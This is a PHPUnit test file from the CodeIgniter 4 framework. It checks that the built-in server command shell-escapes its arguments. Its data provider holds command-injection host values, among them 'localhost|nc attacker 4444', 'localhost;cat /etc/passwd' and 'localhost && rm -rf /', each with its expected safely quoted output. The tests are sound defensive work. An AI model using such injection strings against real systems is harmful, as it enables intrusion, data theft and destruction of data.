<?php

declare(strict_types=1);

/**
 * This file is part of CodeIgniter 4 framework.
 *
 * (c) CodeIgniter Foundation <admin@codeigniter.com>
 *
 * For the full copyright and license information, please view
 * the LICENSE file that was distributed with this source code.
 */

namespace CodeIgniter\Commands\Server;

use Closure;
use CodeIgniter\Test\CIUnitTestCase;
use PHPUnit\Framework\Attributes\DataProvider;
use PHPUnit\Framework\Attributes\Group;
use PHPUnit\Framework\Attributes\RequiresOperatingSystem;

/**
 * @internal
 */
#[Group('Others')]
#[RequiresOperatingSystem('^(?!WIN)')]
final class ServeTest extends CIUnitTestCase
{
    /**
     * @return Closure(string, string, int, string, string): string
     */
    private function buildServeCommand(): Closure
    {
        /** @var Closure(string, string, int, string, string): string */
        return self::getPrivateMethodInvoker(
            new Serve(service('logger'), service('commands')),
            'buildServeCommand',
        );
    }

    public function testBuildsExpectedCommandWithDefaultArguments(): void
    {
        $build = $this->buildServeCommand();

        $command = $build('/usr/bin/php', 'localhost', 8080, '/srv/public', '/srv/system/rewrite.php');

        $this->assertSame(
            "'/usr/bin/php' -S 'localhost:8080' -t '/srv/public' '/srv/system/rewrite.php'",
            $command,
        );
    }

    #[DataProvider('provideEscapesMaliciousHosts')]
    public function testEscapesMaliciousHosts(string $host, string $expected): void
    {
        $build = $this->buildServeCommand();

        $command = $build('/usr/bin/php', $host, 8080, '/srv/public', '/srv/system/rewrite.php');

        $this->assertSame($expected, $command);
    }

    /**
     * @return iterable<string, array{string, string}>
     */
    public static function provideEscapesMaliciousHosts(): iterable
    {
        yield 'command substitution dollar' => [
            '$(id)',
            "'/usr/bin/php' -S '\$(id):8080' -t '/srv/public' '/srv/system/rewrite.php'",
        ];

        yield 'command substitution backtick' => [
            '`whoami`',
            "'/usr/bin/php' -S '`whoami`:8080' -t '/srv/public' '/srv/system/rewrite.php'",
        ];

        yield 'shell separator semicolon' => [
            'localhost;cat /etc/passwd',
            "'/usr/bin/php' -S 'localhost;cat /etc/passwd:8080' -t '/srv/public' '/srv/system/rewrite.php'",
        ];

        yield 'shell separator pipe' => [
            'localhost|nc attacker 4444',
            "'/usr/bin/php' -S 'localhost|nc attacker 4444:8080' -t '/srv/public' '/srv/system/rewrite.php'",
        ];

        yield 'shell separator ampersand' => [
            'localhost && rm -rf /',
            "'/usr/bin/php' -S 'localhost && rm -rf /:8080' -t '/srv/public' '/srv/system/rewrite.php'",
        ];

        yield 'redirection' => [
            'localhost>/tmp/pwn',
            "'/usr/bin/php' -S 'localhost>/tmp/pwn:8080' -t '/srv/public' '/srv/system/rewrite.php'",
        ];

        yield 'embedded single quote' => [
            "a'b",
            "'/usr/bin/php' -S 'a'\\''b:8080' -t '/srv/public' '/srv/system/rewrite.php'",
        ];

        yield 'newline' => [
            "localhost\nmalicious",
            "'/usr/bin/php' -S 'localhost\nmalicious:8080' -t '/srv/public' '/srv/system/rewrite.php'",
        ];
    }

    public function testEscapesPhpBinaryAndPaths(): void
    {
        $build = $this->buildServeCommand();

        $command = $build(
            '/path with spaces/php',
            'localhost',
            8080,
            '/path with spaces/public',
            '/path with spaces/system/rewrite.php',
        );

        $this->assertSame(
            "'/path with spaces/php' -S 'localhost:8080' -t '/path with spaces/public' '/path with spaces/system/rewrite.php'",
            $command,
        );
    }

    public function testHonoursAdjustedPortValue(): void
    {
        $build = $this->buildServeCommand();

        $command = $build('/usr/bin/php', 'localhost', 8082, '/srv/public', '/srv/system/rewrite.php');

        $this->assertSame(
            "'/usr/bin/php' -S 'localhost:8082' -t '/srv/public' '/srv/system/rewrite.php'",
            $command,
        );
    }
}
